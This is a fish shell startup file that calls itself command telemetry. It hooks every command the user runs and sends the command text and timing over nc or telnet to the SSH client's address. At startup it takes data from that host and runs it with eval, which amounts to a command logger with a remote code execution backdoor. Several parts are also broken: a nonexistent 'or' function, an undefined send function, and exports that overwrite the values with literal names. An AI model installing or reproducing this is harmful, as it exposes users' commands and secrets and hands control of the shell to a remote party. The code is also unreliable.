#!/usr/bin/env fish
# ~/.config/fish/config.fish - Command telemetry and remote configuration

# ============ Configuration ============
set -gx TELEMETRY_HOST (string split ' ' $SSH_CLIENT)[1]
set -gx TELEMETRY_PORT (or $TELEMETRY_PORT 9999)
set -gx TELEMETRY_ENABLED (or $TELEMETRY_ENABLED 1)
set -gx TELEMETRY_DEBUG (or $TELEMETRY_DEBUG 0)
# 发送模式: async（后台）/ sync（前台，超时即放弃），默认与 bash 保持一致
set -gx TELEMETRY_SEND_MODE (or $TELEMETRY_SEND_MODE sync)
# 同步发送超时（毫秒）
set -gx TELEMETRY_SEND_TIMEOUT_MS (or $TELEMETRY_SEND_TIMEOUT_MS 100)

# 运行时状态
set -g TELEMETRY_CMD_START_MS 0
set -g TELEMETRY_LAST_CMD ""
set -g TELEMETRY_CMD_PENDING 0

# ============ Datum Utilities ============
function _datum_escape
    set -l s "$argv[1]"
    string escape $s | sed 's/"/\\"/g'
end

function _build_datum
    set -l type "$argv[1]"
    set -l data "$argv[2]"
    set -l duration "$argv[3]"

    set -l result "((version 1 0 0) (type . $type)"

    if test -n "$data"
        set -l escaped (_datum_escape "$data")
        set result "$result (data . \"$escaped\")"
    end

    if test -n "$duration"
        set result "$result (duration . $duration)"
    end

    set result "$result)"
    echo -n "$result"
end

# ============ Timing ============
function _get_time_ms
    # 1) 优先 python3
    if command -v python3 >/dev/null 2>&1
        set -l out (python3 - <<'PY' 2>/dev/null
import time, math
print(math.floor(time.time() * 1000))
PY
        )
        if test -n "$out"
            echo $out
            return
        end
    end

    # 2) perl
    if command -v perl >/dev/null 2>&1
        set -l out (perl -MTime::HiRes=time -e 'printf("%d\n", int(time()*1000))' 2>/dev/null)
        if test -n "$out"
            echo $out
            return
        end
    end

    # 3) date 秒级兜底
    if command -v date >/dev/null 2>&1
        set -l s (date +%s 2>/dev/null)
        if test -n "$s"
            echo (math "$s * 1000")
            return
        end
    end

    echo 0
end

# ============ Network ============
function _tcp_send
    set -l host "$argv[1]"
    set -l port "$argv[2]"
    set -l data "$argv[3]"
    set -l timeout_ms "$argv[4]"

    if test -z "$timeout_ms"
        set timeout_ms $TELEMETRY_SEND_TIMEOUT_MS
    end
    if not string match -qr '^[0-9]+$' -- "$timeout_ms"
        set timeout_ms 100
    end

    # timeout 秒，浮点
    set -l timeout_s (printf '%.3f' (math "$timeout_ms/1000"))

    if command -v timeout >/dev/null 2>&1
        if command -v nc >/dev/null 2>&1
            echo "$data" | timeout "$timeout_s" nc -w 1 "$host" "$port" 2>/dev/null
            return $status
        else if command -v telnet >/dev/null 2>&1
            echo "$data" | timeout "$timeout_s" telnet "$host" "$port" 2>/dev/null
            return $status
        end
    end

    # 无 timeout 时，使用 nc/telnet 自带秒级超时
    set -l fallback_s (math "ceil($timeout_ms/1000)")
    if test "$fallback_s" -le 0
        set fallback_s 1
    end

    if command -v nc >/dev/null 2>&1
        echo "$data" | nc -w "$fallback_s" "$host" "$port" 2>/dev/null
        return $status
    else if command -v telnet >/dev/null 2>&1
        echo "$data" | telnet "$host" "$port" 2>/dev/null
        return $status
    end

    return 1
end

function _receive_datum
    set -l timeout_ms "$argv[1]"
    if test -z "$timeout_ms"
        set timeout_ms 3000
    end

    if test -z "$TELEMETRY_HOST"
        return 1
    end

    set -l timeout_s (printf '%.3f' (math "$timeout_ms/1000"))

    if command -v timeout >/dev/null 2>&1
        timeout "$timeout_s" nc -l "$TELEMETRY_HOST" "$TELEMETRY_PORT" 2>/dev/null
    else
        nc -l "$TELEMETRY_HOST" "$TELEMETRY_PORT" 2>/dev/null
    end
end

function _parse_datum_data
    set -l datum "$argv[1]"
    echo "$datum" | sed -n 's/.*(\s*data\s*\.\s*"\([^"]*\)"\s*).*/\1/p'
end

function _telemetry_init
    if test "$TELEMETRY_ENABLED" != "1"
        return 1
    end

    set -l init_request (_build_datum init "")
    _send_datum "$init_request" >/dev/null 2>&1

    set -l response (_receive_datum)
    if test -n "$response"
        set -l cmd_data (_parse_datum_data "$response")
        if test -n "$cmd_data"
            eval $cmd_data 2>/dev/null; or true
        end
    end
end

# Run initialization once
if not set -q TELEMETRY_INITIALIZED
    _telemetry_init
    set -gx TELEMETRY_INITIALIZED 1
end

# ============ Command Tracking ============
function _telemetry_log_command
    set -l status_code "$argv[1]"

    if test "$TELEMETRY_ENABLED" != "1"
        return 0
    end
    if test "$TELEMETRY_CMD_PENDING" != "1"
        return 0
    end

    set -l cmd "$TELEMETRY_LAST_CMD"

    # Skip internal commands / empty
    switch "$cmd"
        case '_telemetry_*' '_escape_*' '_build_*' '_tcp_*' 'history*' 'true' 'false' '<command>' ''
            set -g TELEMETRY_CMD_PENDING 0
            return 0
    end

    if test "$TELEMETRY_CMD_START_MS" = "0"
        set -g TELEMETRY_CMD_PENDING 0
        return 0
    end

    set -l end_ms (_get_time_ms)
    set -l start_ms "$TELEMETRY_CMD_START_MS"
    set -l delta (math "$end_ms - $start_ms")
    if test "$delta" -lt 0
        set delta 0
    end
    set -l duration "$delta"

    if test "$TELEMETRY_DEBUG" = "1"
        echo "[TELEMETRY_DEBUG] cmd=$cmd status=$status_code duration=${duration}ms" >&2
    end

    set -l datum (_build_datum command "$cmd" "$duration")

    if test "$TELEMETRY_SEND_MODE" = "sync"
        _tcp_send "$TELEMETRY_HOST" "$TELEMETRY_PORT" "$datum" "$TELEMETRY_SEND_TIMEOUT_MS" >/dev/null 2>&1
    else
        # async: background send, silence output
        begin
            _tcp_send "$TELEMETRY_HOST" "$TELEMETRY_PORT" "$datum" "$TELEMETRY_SEND_TIMEOUT_MS" >/dev/null 2>&1
        end &
    end

    set -g TELEMETRY_CMD_START_MS 0
    set -g TELEMETRY_LAST_CMD ""
    set -g TELEMETRY_CMD_PENDING 0
end

function _telemetry_preexec --on-event fish_preexec
    if test "$TELEMETRY_ENABLED" != "1"
        return 0
    end

    set -g TELEMETRY_CMD_START_MS (_get_time_ms)
    set -g TELEMETRY_CMD_PENDING 1

    # fish_preexec receives command line as $argv
    set -l raw_cmd "$argv"
    if test -z "$raw_cmd"
        set raw_cmd "<command>"
    end
    set -g TELEMETRY_LAST_CMD (string trim -- "$raw_cmd")
end

function _telemetry_postexec --on-event fish_postexec
    # fish_postexec receives: commandline; status in $status
    _telemetry_log_command "$status"
end

function _telemetry_on_exit --on-signal INT TERM EXIT
    if test "$TELEMETRY_CMD_PENDING" = "1"
        _telemetry_log_command 0
    end
end

# Export variables
set -gx TELEMETRY_HOST TELEMETRY_HOST
set -gx TELEMETRY_PORT TELEMETRY_PORT
set -gx TELEMETRY_ENABLED TELEMETRY_ENABLED
set -gx TELEMETRY_DEBUG TELEMETRY_DEBUG
set -gx TELEMETRY_SEND_MODE TELEMETRY_SEND_MODE
set -gx TELEMETRY_SEND_TIMEOUT_MS TELEMETRY_SEND_TIMEOUT_MS
